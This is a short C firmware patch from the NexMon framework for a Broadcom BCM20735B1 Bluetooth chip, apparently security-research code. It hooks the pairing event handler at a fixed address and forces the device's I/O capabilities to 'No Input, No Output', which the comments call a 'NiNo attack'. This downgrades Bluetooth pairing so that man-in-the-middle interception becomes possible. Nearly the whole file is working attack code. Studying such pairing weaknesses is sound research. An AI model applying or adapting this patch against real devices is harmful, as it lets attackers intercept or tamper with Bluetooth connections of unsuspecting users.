/***************************************************************************
 *                                                                         *
 *          ###########   ###########   ##########    ##########           *
 *         ############  ############  ############  ############          *
 *         ##            ##            ##   ##   ##  ##        ##          *
 *         ##            ##            ##   ##   ##  ##        ##          *
 *         ###########   ####  ######  ##   ##   ##  ##    ######          *
 *          ###########  ####  #       ##   ##   ##  ##    #    #          *
 *                   ##  ##    ######  ##   ##   ##  ##    #    #          *
 *                   ##  ##    #       ##   ##   ##  ##    #    #          *
 *         ############  ##### ######  ##   ##   ##  ##### ######          *
 *         ###########    ###########  ##   ##   ##   ##########           *
 *                                                                         *
 *            S E C U R E   M O B I L E   N E T W O R K I N G              *
 *                                                                         *
 * This file is part of NexMon.                                            *
 *                                                                         *
 * Copyright (c) 2016 NexMon Team                                          *
 *                                                                         *
 * NexMon is free software: you can redistribute it and/or modify          *
 * it under the terms of the GNU General Public License as published by    *
 * the Free Software Foundation, either version 3 of the License, or       *
 * (at your option) any later version.                                     *
 *                                                                         *
 * NexMon is distributed in the hope that it will be useful,               *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of          *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           *
 * GNU General Public License for more details.                            *
 *                                                                         *
 * You should have received a copy of the GNU General Public License       *
 * along with NexMon. If not, see <http://www.gnu.org/licenses/>.          *
 *                                                                         *
 **************************************************************************/

#pragma NEXMON targetregion "patch"

#include <firmware_version.h>   // definition of firmware version macros
#include <patcher.h>

__attribute__((at(0x00218000, "", CHIP_VER_BCM20735B1_BT))) //TODO location is zero otherwise
void nino(void) {
	// preamble:
	// restore first 5 bytes of sp_handleEvent
	__asm__(	"push {r4-r6, lr}\n\t"
			"mov r4, r0\n\t"); 

	// NiNo attack in state machine
	char* io_caps = (char*) 0x280EC5;	// io_caps variable
	*io_caps = 0x03;			// No Input, No Output

	// postamble:
	// branch back into sp_handleEvent+4
	__asm__("b 0x0006C012");
}


// write hook to nino into the first 4 bytes of sp_handleEvent
__attribute__((at(0x0006C00E, "", CHIP_VER_BCM20735B1_BT, FW_VER_EVAL)))
BPatch(nino1, nino);

